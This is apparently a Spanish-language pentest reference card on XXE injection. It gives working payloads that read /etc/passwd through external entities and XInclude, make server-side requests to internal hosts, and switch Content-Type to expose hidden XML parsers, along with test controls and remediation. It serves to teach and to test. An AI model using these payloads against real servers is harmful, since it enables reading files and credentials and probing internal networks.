---
clase: inyeccion
tech: xml-parsers
cwe: CWE-611
cvss: 9.1 # [derivado] lectura de ficheros arbitrarios mas SSRF
payload: |
  # Peticion base SIN ataque - LITERAL de la fuente:
  <?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>
  #
  # ---- LECTURA DE FICHEROS - LITERAL de la fuente ----
  <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
  # Respuesta LITERAL (el '...' es de la propia fuente):
  #   Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...
  #
  # ---- SSRF VIA XXE - LITERAL ----
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
  #
  # ---- XINCLUDE (cuando no se controla el documento completo) - LITERAL ----
  <foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
  #
  # ---- CAMBIO DE CONTENT-TYPE para alcanzar superficie oculta - LITERALES ----
  # Original:
  POST /action HTTP/1.0
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 7

  foo=bar
  # Modificada:
  POST /action HTTP/1.0
  Content-Type: text/xml
  Content-Length: 52

  <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
  # El cuerpo son 52 bytes si NO hay espacio entre '?>' y '<foo>', lo que coincide con
  # el Content-Length declarado.
  #
  # NOTA: la fuente menciona SVG y DOCX como formatos XML que son superficie de ataque,
  # pero NO da payload para subida de ficheros. No lo invento.
precondicion: "Un parser XML que resuelva entidades externas. Para XInclude basta que la entrada del usuario se INSERTE en un documento XML del servidor: no hace falta controlar el DOCTYPE, que es justo la limitacion que XInclude elude. El cambio de Content-Type requiere que el endpoint acepte XML aunque el cliente legitimo envie formularios."
como_se_descubre: |
  Metodologia LITERAL de la fuente, en cuatro sondas:
  1. Lectura de ficheros: definir una entidad externa sobre un fichero conocido del SO
     y usarla en un nodo que se refleje. La fuente insiste en probar 'each data node in
     the XML individually': un solo nodo reflejado basta y puede no ser el obvio.
  2. XXE ciega: entidad externa sobre una URL propia y vigilar interacciones.
  3. XInclude: inyectar el ataque en datos NO XML del usuario.
  4. CAMBIO DE CONTENT-TYPE, la sonda de mayor rendimiento y la que mas se olvida:
     convertir un POST de formulario en XML. Si el endpoint lo parsea, habia una
     superficie XML completa que ningun escaneo del formulario habria encontrado.
  La fuente añade que conviene probar tambien XSS e inyeccion SQL sobre la
  funcionalidad XML.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: entidad externa sobre file:///etc/passwd -> contenido en la respuesta
  # B: entidad externa sobre file:///ruta/inexistente -> error DISTINTO del de A
  # C: la misma peticion sin DOCTYPE -> respuesta normal
  # El par A/B distingue 'las entidades se resuelven' de 'el DOCTYPE se rechaza': si A
  # y B dan el MISMO error, el parser no esta resolviendo nada y la clase muere.
  # Para el cambio de Content-Type:
  # D: Content-Type: text/xml con XML VALIDO -> ¿se parsea?
  # E: Content-Type: text/xml con XML MALFORMADO -> un error de parseo XML es la
  #    confirmacion POSITIVA de que hay un parser detras.
mata: |
  - Resolucion de entidades externas deshabilitada -> muere. Es la correccion.
  - Soporte de XInclude deshabilitado (la fuente lo nombra expresamente aparte).
  - A y B producen el mismo error -> el DOCTYPE se rechaza, no hay resolucion.
  - El endpoint rechaza Content-Type: text/xml -> no hay superficie XML oculta.
mata_nota: |
  # El punto de XInclude merece subrayarse: deshabilitar la resolucion de entidades NO
  # mata XInclude. Son dos ajustes distintos, y la fuente los nombra por separado en su
  # remediacion. Una correccion que solo desactive entidades deja XInclude abierto.
fuente: "https://portswigger.net/web-security/xxe y https://portswigger.net/web-security/xxe/blind. Todos los payloads literales de las paginas. Los '...' dentro de las respuestas son truncamientos de la propia fuente. No hay payload de subida de SVG/DOCX en la fuente. ADVERTENCIA: el render colapso los saltos de linea; las lineas HTTP aparecen en una sola."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] XXE — lectura de ficheros, SSRF, XInclude y el cambio de `Content-Type`

## Principio
Un parser XML que resuelve entidades externas convierte un documento de datos en un
cliente de red y de sistema de ficheros. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
no es un exploit: es una función documentada de XML que casi ninguna aplicación necesita.

## Payload
Lectura de ficheros:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
```

→ `Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:...`

SSRF por la misma vía:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## XInclude, para cuando no se controla el documento
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Esta variante importa por una razón concreta: **no necesita el `DOCTYPE`**. Sirve cuando
la entrada del usuario se inserta en un documento XML que construye el servidor, un
escenario donde el XXE clásico no llega.

Y tiene una consecuencia para la remediación que suele pasarse por alto: **deshabilitar
la resolución de entidades no mata XInclude**. Son dos ajustes distintos, y la propia
fuente los nombra por separado. Una corrección a medias deja esta puerta abierta.

## La sonda de mayor rendimiento: cambiar el `Content-Type`
Original:
```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Modificada:
```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

Esto es lo que la fuente llama alcanzar superficie de ataque oculta, y es la sonda que
más se olvida: un endpoint que recibe formularios puede tener detrás un parser XML
completo que ningún escaneo del formulario encontraría. Una petición abre una clase
entera de vulnerabilidad.

Detalle de verificación: el cuerpo son exactamente 52 bytes si **no** hay espacio entre
`?>` y `<foo>`, lo que concuerda con el `Content-Length` declarado.

## El control con un fichero inexistente
Si la entidad apunta a un fichero que no existe y el error es **idéntico** al del fichero
válido, el parser no está resolviendo nada: el `DOCTYPE` se rechaza y la clase muere. Dos
peticiones evitan construir toda una cadena sobre una base falsa.

Para el cambio de `Content-Type`, el control equivalente es enviar XML **malformado**: un
error de parseo XML es la confirmación positiva de que hay un parser detrás.

## Nota de procedencia
La fuente menciona SVG y DOCX como formatos XML que constituyen superficie de ataque,
pero **no da payload** para subida de ficheros. No lo invento.

## Impacto
Lectura de ficheros arbitrarios del servidor —configuración, credenciales, claves— y SSRF
hacia la red interna con la posición de red del servidor de aplicación.

## Remediación
Cita literal: *"Generally, it is sufficient to disable resolution of external entities and
disable support for `XInclude`."* Las dos cosas, no una. Normalmente se hace por
configuración del parser o sobrescribiendo los valores por defecto de forma programática.
